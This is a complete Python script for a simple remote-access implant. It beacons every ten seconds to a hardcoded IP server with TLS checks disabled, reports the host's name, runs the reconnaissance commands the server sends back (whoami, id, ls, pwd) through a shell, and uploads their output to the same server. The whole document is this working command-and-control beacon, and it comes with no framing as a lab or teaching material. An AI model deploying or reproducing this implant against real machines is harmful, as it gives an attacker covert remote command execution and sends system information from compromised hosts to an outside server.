import requests
import time
import socket
import subprocess
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import urllib.parse

SERVER = "https://172.179.101.52"
while (True):
    hostname = socket.gethostname()
    r = None
    noconn = False
    try:
        r = requests.get(SERVER + "/checkin?hostname=" + hostname, verify=False)
    except:
        noconn = True
    if (noconn == False):
        # is there a job for me?
        data = r.text
        if (data == "stop"):
            exit()
        elif (data == "nop"):
            # no op, do nothing
            x = 1
        elif (data == "pwd" or data == "whoami" or data == "ls" or data == "id"):
            args = [data]
            result = subprocess.run(args, shell=True, capture_output=True, text=True)
            combo = urllib.parse.quote_plus(result.stdout + result.stderr)
            r = requests.get(SERVER + "/upload?hostname=" + hostname + "&data=" + combo, verify=False)
    #print("[ ] Sleeping 10 seconds")
    time.sleep(10)
